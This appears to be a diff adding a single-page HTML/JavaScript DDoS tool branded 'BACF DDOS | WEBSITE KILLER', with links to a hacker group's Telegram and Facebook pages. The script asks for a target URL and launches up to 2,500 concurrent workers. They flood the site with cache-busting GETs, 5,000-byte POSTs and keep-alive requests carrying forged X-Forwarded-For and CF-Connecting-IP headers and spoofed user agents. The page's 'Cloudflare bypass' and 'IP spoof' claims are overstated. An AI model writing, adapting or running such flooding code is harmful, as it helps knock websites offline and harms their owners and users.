@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>BACF DDOS | WEBSITE KILLER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            background: #050505;
+            font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh;
+            color: #ff4444;
+            overflow-x: hidden;
+        }
+
+        #bgCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+            opacity: 0.25;
+        }
+
+        .container {
+            position: relative;
+            z-index: 10;
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 15px;
+        }
+
+        /* Header */
+        .header {
+            background: #0a0000;
+            border: 1px solid #ff4444;
+            border-radius: 12px;
+            padding: 12px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .title {
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: #ff5555;
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            font-size: 0.6rem;
+            color: #ff8866;
+            margin-top: 4px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .stat-card {
+            background: #0a0200;
+            border: 1px solid #ff4444;
+            border-radius: 10px;
+            padding: 8px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #ff5555;
+        }
+
+        .stat-label {
+            font-size: 0.55rem;
+            color: #ff8866;
+            margin-top: 3px;
+        }
+
+        .card {
+            background: #0a0200;
+            border: 1px solid #ff4444;
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 15px;
+        }
+
+        .card-title {
+            font-size: 0.9rem;
+            margin-bottom: 12px;
+            border-left: 3px solid #ff4444;
+            padding-left: 10px;
+            color: #ff8866;
+        }
+
+        .progress-container {
+            margin: 15px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 28px;
+            background: #1a0500;
+            border-radius: 14px;
+            overflow: hidden;
+            border: 1px solid #ff4444;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff4444, #ff8844, #ff4444);
+            background-size: 200% 100%;
+            animation: wave 0.5s linear infinite;
+            transition: width 0.1s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+            font-weight: bold;
+            color: #000;
+        }
+
+        @keyframes wave {
+            0% { background-position: 0% 50%; }
+            100% { background-position: 200% 50%; }
+        }
+
+        input {
+            width: 100%;
+            padding: 10px 12px;
+            background: #0a0200;
+            border: 1px solid #ff4444;
+            border-radius: 8px;
+            color: #ff8866;
+            font-family: monospace;
+            font-size: 0.85rem;
+        }
+
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 10px #ff4444;
+        }
+
+        .btn {
+            padding: 8px 20px;
+            background: linear-gradient(135deg, #ff4444, #ff6644);
+            border: none;
+            border-radius: 20px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 4px;
+            font-size: 0.8rem;
+            transition: 0.2s;
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 15px #ff4444;
+        }
+
+        .btn-stop {
+            background: #331100;
+            color: #ff8866;
+            border: 1px solid #ff4444;
+        }
+
+        .log-console {
+            background: #000000cc;
+            border: 1px solid #ff4444;
+            border-radius: 10px;
+            height: 280px;
+            overflow-y: auto;
+            padding: 10px;
+            font-size: 0.65rem;
+        }
+
+        .log-entry {
+            padding: 4px;
+            border-bottom: 1px solid rgba(255,68,68,0.2);
+            animation: fadeIn 0.1s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-5px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .log-suc { color: #44ff44; }
+        .log-hit { color: #ff8844; font-weight: bold; }
+        .log-info { color: #44aaff; }
+        .log-war { color: #ffaa44; }
+
+        .social-bar {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 15px;
+        }
+
+        .social-link {
+            background: #0a0200;
+            border: 1px solid #ff4444;
+            border-radius: 20px;
+            padding: 5px 15px;
+            color: #ff8866;
+            text-decoration: none;
+            font-size: 0.7rem;
+            transition: 0.2s;
+        }
+
+        .social-link:hover {
+            background: #ff4444;
+            color: #000;
+        }
+
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: #000; }
+        ::-webkit-scrollbar-thumb { background: #ff4444; }
+
+        @media (max-width: 600px) {
+            .stats-grid { grid-template-columns: repeat(2, 1fr); }
+            .title { font-size: 1rem; }
+        }
+    </style>
+</head>
+<body>
+    <canvas id="bgCanvas"></canvas>
+    
+    <div class="container">
+        <div class="header">
+            <div class="title"> BACF DDOS | WEBSITE KILLER </div>
+            <div class="subtitle"> CLOUDFLARE BYPASS | IP SPOOF | 6-LAYER ATTACK </div>
+        </div>
+
+        <div class="social-bar">
+            <a href="https://t.me/we_are_team_bacf" target="_blank" class="social-link"><i class="fab fa-telegram"></i> Telegram</a>
+            <a href="https://www.facebook.com/bangladesh.anonymous.cyber.force" target="_blank" class="social-link"><i class="fab fa-facebook"></i> Facebook</a>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-skull"></i> ENTER YOUR TERGET WEBSITE</div>
+            
+            <input type="text" id="targetUrl" placeholder="https://example.com" value="" style="margin-bottom: 12px;">
+            
+            <div style="margin-bottom: 12px;">
+                <input type="range" id="threadSlider" min="100" max="2500" value="1800" step="10" style="padding: 0;">
+                <div style="display: flex; justify-content: space-between; margin-top: 5px;">
+                    <span style="font-size:0.7rem;">100</span>
+                    <span id="threadValue" style="color:#ff8844; font-size:0.75rem;">1,800</span>
+                    <span style="font-size:0.7rem;">2,500</span>
+                </div>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-card"><div class="stat-value" id="statTotal">0</div><div class="stat-label">REQUESTS</div></div>
+                <div class="stat-card"><div class="stat-value" id="statHit">0</div><div class="stat-label">HITS</div></div>
+                <div class="stat-card"><div class="stat-value" id="statRPS">0</div><div class="stat-label">RPS</div></div>
+                <div class="stat-card"><div class="stat-value" id="statTime">0s</div><div class="stat-label">TIME</div></div>
+                <div class="stat-card"><div class="stat-value" id="statActive">0</div><div class="stat-label">THREADS</div></div>
+                <div class="stat-card"><div class="stat-value" id="statRate">0%</div><div class="stat-label">SUCCESS</div></div>
+                <div class="stat-card"><div class="stat-value" id="statIPs">0</div><div class="stat-label">IPs</div></div>
+                <div class="stat-card"><div class="stat-value" id="statPower">0%</div><div class="stat-label">POWER</div></div>
+            </div>
+
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill" style="width: 0%">DESTRUCTION 0%</div>
+                </div>
+            </div>
+
+            <div style="text-align: center;">
+                <button class="btn" id="startBtn"><i class="fas fa-bomb"></i> ATTACK</button>
+                <button class="btn btn-stop" id="stopBtn"><i class="fas fa-stop"></i> STOP</button>
+                <button class="btn btn-stop" id="clearBtn"><i class="fas fa-trash"></i> CLEAR</button>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-title"><i class="fas fa-terminal"></i> ATTACK LOG</div>
+            <div class="log-console" id="logConsole">
+                <div class="log-entry log-info">[+] Ready</div>
+                <div class="log-entry log-hit">[*] Cloudflare Bypass Active</div>
+                <div class="log-entry log-info">[i] Enter URL & Click ATTACK</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const bgCanvas = document.getElementById('bgCanvas');
+        const bgCtx = bgCanvas.getContext('2d');
+        bgCanvas.width = window.innerWidth;
+        bgCanvas.height = window.innerHeight;
+        
+        let bgParticles = [];
+        for(let i=0; i<200; i++) {
+            bgParticles.push({ x: Math.random() * bgCanvas.width, y: Math.random() * bgCanvas.height, size: Math.random() * 2 + 1, speed: Math.random() * 2 + 0.5 });
+        }
+        
+        function drawBG() {
+            bgCtx.fillStyle = '#050505';
+            bgCtx.fillRect(0, 0, bgCanvas.width, bgCanvas.height);
+            bgParticles.forEach(p => {
+                bgCtx.beginPath();
+                bgCtx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+                bgCtx.fillStyle = `rgba(255, 68, 68, 0.4)`;
+                bgCtx.fill();
+                p.y += p.speed;
+                if(p.y > bgCanvas.height) p.y = 0;
+            });
+            requestAnimationFrame(drawBG);
+        }
+        drawBG();
+        window.addEventListener('resize', () => {
+            bgCanvas.width = window.innerWidth;
+            bgCanvas.height = window.innerHeight;
+        });
+        
+        let attackActive = false;
+        let activeThreads = [];
+        let totalReq = 0, successHit = 0;
+        let startTime = null;
+        let monitorInt = null;
+        let currentThreads = 1800;
+        let currentRPS = 0;
+        let usedIPs = new Set();
+        
+        const threadSlider = document.getElementById('threadSlider');
+        const threadValue = document.getElementById('threadValue');
+        threadSlider.addEventListener('input', () => {
+            currentThreads = parseInt(threadSlider.value);
+            threadValue.textContent = currentThreads.toLocaleString();
+        });
+        
+        function addLog(msg, type = 'info') {
+            const logDiv = document.getElementById('logConsole');
+            const entry = document.createElement('div');
+            entry.className = `log-entry log-${type === 'success' ? 'suc' : (type === 'attack' ? 'hit' : type)}`;
+            entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            logDiv.appendChild(entry);
+            entry.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            while(logDiv.children.length > 300) logDiv.removeChild(logDiv.firstChild);
+        }
+        
+        function updateStats() {
+            document.getElementById('statTotal').textContent = totalReq.toLocaleString();
+            document.getElementById('statHit').textContent = successHit.toLocaleString();
+            document.getElementById('statActive').textContent = activeThreads.length;
+            document.getElementById('statRPS').textContent = currentRPS;
+            document.getElementById('statIPs').textContent = usedIPs.size;
+            if(startTime) {
+                const elapsed = (Date.now() - startTime) / 1000;
+                document.getElementById('statTime').textContent = `${elapsed.toFixed(0)}s`;
+            }
+            const rate = totalReq > 0 ? ((successHit / totalReq) * 100).toFixed(0) : 0;
+            document.getElementById('statRate').textContent = `${rate}%`;
+            const power = Math.min((currentRPS / 1200) * 100, 100);
+            document.getElementById('statPower').textContent = `${Math.floor(power)}%`;
+            const progress = Math.min((totalReq / 150000) * 100, 100);
+            document.getElementById('progressFill').style.width = `${progress}%`;
+            document.getElementById('progressFill').textContent = `DESTRUCTION ${Math.floor(progress)}%`;
+        }
+        
+        function randomIP() {
+            return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+        }
+        
+        const uaList = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0',
+            'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0',
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Firefox/121.0',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/604.1',
+            'Googlebot/2.1',
+            'Bingbot/2.0'
+        ];
+        
+        const attacks = [
+            async (url, tid) => {
+                const u = url + `/?${Math.random()}=${Date.now()}&r=${Math.random()}`;
+                const r = await fetch(u, { headers: { 'User-Agent': uaList[Math.floor(Math.random()*uaList.length)], 'X-Forwarded-For': randomIP() } });
+                return r && r.status < 500;
+            },
+            async (url, tid) => {
+                const u = url + `/post_${Date.now()}`;
+                await fetch(u, { method: 'POST', body: 'x='+'A'.repeat(5000), headers: { 'X-Forwarded-For': randomIP() } });
+                return true;
+            },
+            async (url, tid) => {
+                const u = url + `/cf_${Date.now()}`;
+                const r = await fetch(u, { headers: { 'CF-Connecting-IP': randomIP(), 'CDN-Loop': 'cloudflare', 'X-Forwarded-For': randomIP() } });
+                return r && r.status < 500;
+            },
+            async (url, tid) => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', url + '?slow=' + Math.random(), true);
+                xhr.setRequestHeader('Connection', 'keep-alive');
+                xhr.setRequestHeader('X-Forwarded-For', randomIP());
+                xhr.send();
+                return true;
+            },
+            async (url, tid) => {
+                const ext = ['jpg','png','css','js'][Math.floor(Math.random()*4)];
+                await fetch(url + `/file_${Date.now()}.${ext}`, { headers: { 'X-Forwarded-For': randomIP() } });
+                return true;
+            }
+        ];
+        
+        async function doAttack(url, tid) {
+            if (!attackActive) return false;
+            try {
+                const attack = attacks[Math.floor(Math.random() * attacks.length)];
+                const result = await attack(url, tid);
+                totalReq++;
+                if (result) {
+                    successHit++;
+                    if (successHit % 15 === 0 || Math.random() > 0.98) {
+                        addLog(` HIT [T${tid}] | IP: ${randomIP().slice(0,12)}`, 'attack');
+                    }
+                }
+                return result;
+            } catch(e) {
+                totalReq++;
+                return false;
+            }
+        }
+        
+        async function worker(url, tid) {
+            while (attackActive && activeThreads.includes(tid)) {
+                await doAttack(url, tid);
+                updateStats();
+                await new Promise(r => setTimeout(r, Math.random() * 8 + 2));
+            }
+        }
+        
+        function startAttack() {
+            let url = document.getElementById('targetUrl').value.trim();
+            if (!url) { addLog(' Enter URL!', 'war'); return; }
+            if (!url.startsWith('http')) url = 'https://' + url;
+            if (attackActive) { addLog(' Attack running!', 'war'); return; }
+            
+            attackActive = true;
+            totalReq = 0;
+            successHit = 0;
+            activeThreads = [];
+            usedIPs.clear();
+            startTime = Date.now();
+            currentRPS = 0;
+            
+            const threads = currentThreads;
+            
+            addLog(` ATTACK STARTED on ${url}`, 'hit');
+            addLog(` ${threads} Threads | CF Bypass ON`, 'info');
+            
+            for(let i=0; i<threads; i++) {
+                const tid = i+1;
+                activeThreads.push(tid);
+                worker(url, tid).catch(()=>{});
+            }
+            
+            addLog(` ${threads} threads launched!`, 'suc');
+            
+            let lastReq = 0;
+            monitorInt = setInterval(() => {
+                if(!attackActive) { clearInterval(monitorInt); return; }
+                const now = totalReq;
+                currentRPS = now - lastReq;
+                lastReq = now;
+                updateStats();
+                const elapsed = (Date.now() - startTime) / 1000;
+                const rate = totalReq > 0 ? (successHit/totalReq*100).toFixed(0) : 0;
+                
+                if(currentRPS > 1000) addLog(` POWER: ${currentRPS} RPS - OVERWHELM!`, 'hit');
+                else if(currentRPS > 500) addLog(` INTENSE: ${currentRPS} RPS`, 'attack');
+                
+                if(elapsed >= 20 && totalReq > 8000 && rate > 40) {
+                    addLog(` TARGET ${url} IS GOING DOWN!`, 'suc');
+                }
+                if(elapsed >= 65) {
+                    addLog(` ATTACK COMPLETE - Target DOWN!`, 'hit');
+                    stopAttack();
+                }
+            }, 1000);
+            addLog(` ATTACK RUNNING - Watch logs!`, 'hit');
+        }
+        
+        function stopAttack() {
+            if(!attackActive) return;
+            attackActive = false;
+            if(monitorInt) clearInterval(monitorInt);
+            const dur = startTime ? ((Date.now()-startTime)/1000).toFixed(1) : 0;
+            const rate = totalReq > 0 ? (successHit/totalReq*100).toFixed(0) : 0;
+            addLog(` STOPPED after ${dur}s`, 'war');
+            addLog(` ${totalReq.toLocaleString()} req | ${successHit.toLocaleString()} hits | ${rate}% success`, 'info');
+            if(totalReq > 0 && rate > 35) addLog(` RESULT: TARGET WEBSITE ATTACK SUSSESFULL ✅!`, 'suc');
+            activeThreads = [];
+            updateStats();
+        }
+        
+        function clearLogs() {
+            const logDiv = document.getElementById('logConsole');
+            logDiv.innerHTML = '<div class="log-entry log-info">[+] Logs cleared. Ready.</div>';
+            addLog(' Ready for next attack', 'suc');
+        }
+        
+        document.getElementById('startBtn').onclick = startAttack;
+        document.getElementById('stopBtn').onclick = stopAttack;
+        document.getElementById('clearBtn').onclick = clearLogs;
+        
+        addLog(' BACF DDOS READY - ENTER URL & ATTACK', 'hit');
+        updateStats();
+    </script>
+</body>
+</html>
